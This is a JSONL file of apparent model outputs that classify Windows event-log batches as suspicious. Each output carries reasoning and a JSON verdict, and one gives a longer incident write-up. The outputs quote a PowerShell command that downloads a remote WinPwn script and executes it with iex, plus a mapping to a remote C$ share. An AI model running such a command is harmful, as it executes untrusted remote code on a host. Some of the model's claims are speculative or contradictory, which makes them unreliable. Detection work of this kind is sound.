{"file":"filtering\/gemma3_4b\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let me try to figure out if this batch of events is interesting or not. So, first, I need to look through all the events and see if there's any suspicious activity. Let's start by going through each line.\n\nThe first event is about powershell.exe with a ProcessAccess task. Not too suspicious on its own. Then there's a whoami.exe process created, which is a normal command to get user info. But then there's another powershell.exe event with a command line that looks like it's downloading a script from a GitHub URL. Wait, that URL is part of a repo called WinPwn, which I think is a known malicious repository. The command uses Invoke-Expression to download and execute a PowerShell script, which is a common technique for malware.\n\nThen there are several ImageLoad events for powershell.exe, loading various DLLs, including some from .NET and Windows Defender. That might be normal, but when combined with the download of a malicious script, it's a red flag. There's also a file created in the Temp directory, which is often used by malware to store temporary files. Then the file is deleted, which could be an attempt to cover tracks. \n\nThe PipeEvent might be normal, but the combination of multiple ImageLoads and the suspicious script download seems concerning. Also, the Registry value set events could indicate changes to the system configuration, possibly for persistence. The presence of the WinPwn.ps1 script from a GitHub link is a strong indicator of malicious activity, especially if that repo is known for hosting malware. \n\nPutting it all together: multiple PowerShell processes, downloading and executing a script from a suspicious source, loading various DLLs, creating and deleting files in temp directories, and registry changes. These are all signs of potential exploitation or malware execution. Even though some events are normal, the combination here points to a possible security incident. So, the classification should be INTERESTING with high confidence.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple PowerShell processes executing suspicious commands, including downloading and executing a script from a GitHub repository associated with malicious activity (WinPwn).

{"file":"filtering\/gemma3_4b\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let's take a look at these events. The user wants to know if this batch is interesting for investigation. First, I need to go through each line and see what's happening.\n\nStarting with the first event: svchost.exe setting a registry value. That's normal, svchost is a common system process. Then sppsvc.exe creating a file in the System32\\spp\\store directory. That seems okay too; sppsvc is related to software protection, and cache.dat might be part of that.\n\nNext, there's a lot of activity from powershell.exe. Multiple events of process access, image loaded, file created, and deleted. The command line in one event shows creating a network drive with 'New-PSDrive' pointing to \\\\Target\\\\C$. That looks suspicious because accessing a remote share might be part of data exfiltration or lateral movement. \n\nThen, several image loads from .NET assemblies like mscoree.dll, clr.dll, and others. Those are legitimate .NET components, but when combined with other actions, they might indicate something. Also, a file is created in the Temp directory and then deleted, which is common in malware to avoid leaving traces. \n\nThe Pipe Created event could be part of inter-process communication, which isn't necessarily bad, but in combination with other suspicious activities, it might be a red flag. The registry value set by powershell.exe might be modifying settings to persist or hide the activity.\n\nPutting it all together: the presence of multiple PowerShell events, especially the network drive creation, file creation and deletion in temp, and loading of .NET assemblies could indicate a script-based attack. The fact that the same process is accessing the registry and creating files might be part of a larger malicious payload. However, some of these events could be benign, like normal PowerShell usage. But the combination of these events, especially the remote network access and temp file handling, raises suspicion. \n\nI think this is interesting enough for investigation. The confidence isn't 100% because some activities are normal, but the cluster of events suggests potential malicious behavior.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple PowerShell events with suspicious actions including network drive creation, temporary file creation\/deletion, and loading of .NET assemblies, which could indicate malicious activity.\",\n  \"CONFIDENCE\": 0.75\n}"}
{"file":"filtering\/gemma3_4b\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let's take a look at these logs. So, there are multiple entries here, all related to PowerShell commands. The first thing I notice is that several of the process entries have the same command line: they're using PowerShell to download a script from a GitHub raw URL using the WebClient object. The URL points to a repository named WinPwn, which sounds suspicious. The command is using 'iex' which is Invoke-Expression, a common method for executing scripts in memory, which is often used in attacks to avoid leaving files on disk.\n\nThen there are a few entries where the command line is different. Those commands are creating a new PSDrive mapped to a network share, specifically \\\\Target\\\\C$. This is a common technique in lateral movement during attacks, where an attacker maps a network drive to access files on another system. The use of 'New-PSDrive' with the -unidade_auxiliar parameter (which I think might be a typo or a non-English term, maybe 'unit_auxiliary'? Or perhaps it's a mistranslation or misused parameter) is a bit odd. Normally, the parameter for the location would be -root or -location, so this might be a mistake or a custom script.\n\nLooking at the winlog task fields, some are 'Provider Lifecycle' and others 'Engine Lifecycle'. Not sure if that's significant, but the repetition of the same command lines multiple times is a red flag. The fact that the same malicious script is being downloaded repeatedly could indicate an ongoing attack or a persistent attempt to execute the script. Also, the presence of both script downloads and network drive mappings suggests that the attacker might be trying to establish a foothold and move laterally within the network.\n\nThe file field is 'None' for all entries, which might mean that no files were created, which aligns with the in-memory execution technique. However, the network drive mapping could be used to access files on the target machine, which might be part of data exfiltration or further attacks.\n\nConsidering all these points, the logs show signs of potential malicious activity, such as downloading and executing a script from a suspicious source and mapping network drives for lateral movement. The repetition of these commands across multiple logs increases the likelihood that this isn't just a one-off event but part of a coordinated attack. Therefore, this would be flagged as a security incident requiring further investigation.\n<\/think>\n\nThe provided logs indicate **potential malicious activity** involving PowerShell-based attacks. Here's a structured analysis:\n\n---\n\n### **Key Findings**\n1. **Malicious Script Download**:\n   - **Command**:  \n     `powershell.exe & {iex (new-object net.webclient).downloadstring('https:\/\/github.com\/...\/WinPwn.ps1')}`  \n     - **Suspicious URL**: The script (`WinPwn.ps1`) is hosted on GitHub, which is often used for legitimate purposes but can also be exploited for malicious payloads.\n     - **Technique**: Uses `iex` (Invoke-Expression) to execute the downloaded script in memory, avoiding disk-based artifacts (common in stealthy attacks).\n   - **Repetition**: This command appears **10+ times**, suggesting repeated attempts to execute the script or persistence mechanisms.\n\n2. **Network Drive Mapping**:\n   - **Command**:  \n     `powershell.exe & {New-PSDrive -name g -psprovider filesystem -unidade_auxiliar \\\\Target\\\\C$}`  \n     - **Purpose**: Maps a network drive (`g:`) to a remote share (`\\\\Target\\\\C$`), likely for **lateral movement** or **data exfiltration**.\n     - **Anomalies**:\n       - The parameter `-unidade_auxiliar` is **unusual** (likely a typo or non-standard usage; correct parameter is `-root` or `-location`).\n       - The share path (`\\\\Target\\\\C$`) implies access to a **remote system's C: drive**, suggesting **compromise of a networked machine**.\n\n3. **Log Consistency**:\n   - **Repeated Commands**: The same malicious script and network drive mapping commands are logged multiple times, indicating **persistent or automated activity**.\n   - **WinLog Tasks**: Logs reference `Provider Lifecycle` and `Engine Lifecycle` tasks, which may relate to PowerShell provider or engine events but lack clear context for benign activity.\n\n---\n\n### **Threat Indicators**\n- **Indicator of Compromise (IoC)**:\n  - **Malicious Script**: `https:\/\/github.com\/...\/WinPwn.ps1` (exact URL requires validation).\n  - **Command Line**: `New-PSDrive` with non-standard parameters and remote share access.\n- **Attack Pattern**:\n  - **Initial Access**: Script download via PowerShell (common in phishing or exploit-based attacks).\n  - **Lateral Movement**: Network drive mapping to access remote systems.\n  - **Persistence**: Repeated execution of the same command.\n\n---\n\n### **Recommendations**\n1. **Investigate the Script**:\n   - Analyze the content of `WinPwn.ps1` (if accessible) to confirm malicious intent (e.g., data exfiltration, privilege escalation).\n   - Check if the script is part of a known toolset (e.g., `WinPwn` may be a red-herring or legitimate tool; confirm via reputation checks).\n\n2. **Network Monitoring**:\n   - Block or restrict access to the GitHub URL if confirmed malicious.\n   - Monitor for **unauthorized network shares** (e.g., `\\\\Target\\\\C$`) and **unusual SMB traffic**.\n\n3. **System Hardening**:\n   - Restrict PowerShell usage via Group Policy (e.g., disable `Invoke-Expression` or script execution).\n   - Enable **PowerShell logging** (e.g., `Transcript` or `Event Log` monitoring) for forensic analysis.\n\n4. **Incident Response**:\n   - Isolate affected systems to prevent lateral movement.\n   - Conduct a **full system scan** for malware or unauthorized modifications.\n\n---\n\n### **Conclusion**\nThe logs strongly suggest **malicious activity**, including script-based attacks and lateral movement attempts. Immediate investigation and mitigation are required to prevent further compromise."}
{"file":"filtering\/gemma3_4b\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let's see. The user provided a bunch of JSON lines, all with the same structure. Each entry has \"process\" as \"None\", \"winlog\" as a string that says 'task': 'Execute a Remote Command', and \"file\" as \"None\". So, there are 20 identical entries here.\n\nFirst, I need to figure out if this batch is interesting for investigation. The key points here are the repeated events. All of them are the same: Execute a Remote Command. But wait, the process and file are both None. That might be a red flag. Normally, if a remote command is executed, there should be some process involved, right? Like a command line tool or a script. If the process is None, maybe that's an indication that the system couldn't capture the process details, or maybe it's a placeholder for missing data.\n\nAlso, the fact that all the events are the same could be a sign of a log injection or a misconfigured logging system. If the same event is logged multiple times, maybe it's a test, or maybe it's a malicious actor trying to overwhelm the log system. But without any variation in the events, it's hard to tell. However, the repetition might be significant. \n\nAnother angle: in a real scenario, executing a remote command would usually have some context. If all the logs are missing the process and file information, that's a problem. It could mean that the logs are incomplete, which is a concern. However, if this is a test environment or a system that's not properly instrumented, maybe it's not malicious.\n\nBut considering the task is to detect malicious behavior, the repeated entries with the same task but no process or file details might be suspicious. It's possible that the system is generating these logs as part of a normal operation, but the absence of process and file details might be a sign of something wrong. Alternatively, if this is a log of successful remote commands, but all are missing context, that's a big red flag. \n\nHowever, since all entries are identical, it's possible that this is a test case or a misconfiguration. But the classification needs to be based on the entire batch. The repetition of the same event without any variation might indicate an automated attack, like a brute force attempt or a script that's repeatedly trying to execute commands. However, without other information like IP addresses, user names, or different parameters, it's hard to be certain.\n\nThe confidence here is a bit tricky. If the system is generating these logs as part of normal operations, maybe it's not interesting. But if the logs are missing critical information (process and file), that's a concern. The fact that all the events are the same might be a sign of a problem. \n\nSo, considering that the same event is repeated multiple times with no process or file details, I would lean towards \"INTERESTING\" because it's unusual and could indicate a problem. The justification would be that the repeated execution of remote commands without process or file information is suspicious and may indicate a misconfiguration or potential malicious activity. The confidence is medium, maybe around 0.65, because while it's not definitive, the repetition and missing details are concerning.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple identical events logging 'Execute a Remote Command' with no process or file context, suggesting potential log injection, misconfiguration, or automated malicious activity.\",\n  \"CONFIDENCE\": 0.65\n}"}
